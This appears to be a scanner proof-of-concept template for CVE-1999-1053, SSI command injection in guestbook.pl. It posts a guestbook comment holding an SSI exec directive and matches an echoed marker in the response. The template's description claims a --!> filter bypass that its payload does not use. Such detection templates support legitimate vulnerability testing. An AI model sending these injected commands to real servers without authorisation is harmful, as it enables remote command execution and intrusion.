[info]
author = "ave"
description = "guestbook.pl 仅通过移除 <!-- 与 --> 之间内容来过滤 SSI 指令，但 Apache 允许其他闭合序列（如 --!>），攻击者可构造绕过过滤的恶意 SSI 语句提交到留言板，在服务器端执行任意命令。本 PoC 通过提交包含 SSI 命令执行的留言并检测返回页面是否回显命令执行结果来判断漏洞存在。"
id = "POC-AVE-1999-1686"
name = "CVE-1999-1053 Guestbook.pl SSI 远程命令执行 PoC"
severity = "high"
tags = ["ave-1999-1686"]
vuln_id = [
    "CVE-1999-1053",
    "AVE-1999-1686",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/guestbook.pl"
protocol = "http"

[poc.requests.body]
content = 'name=ave_test&email=test@test.com&comments=<!--#exec cmd="echo AVE_SSI_TEST_1234" -->&submit=Sign'
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVE_SSI_TEST_1234"]
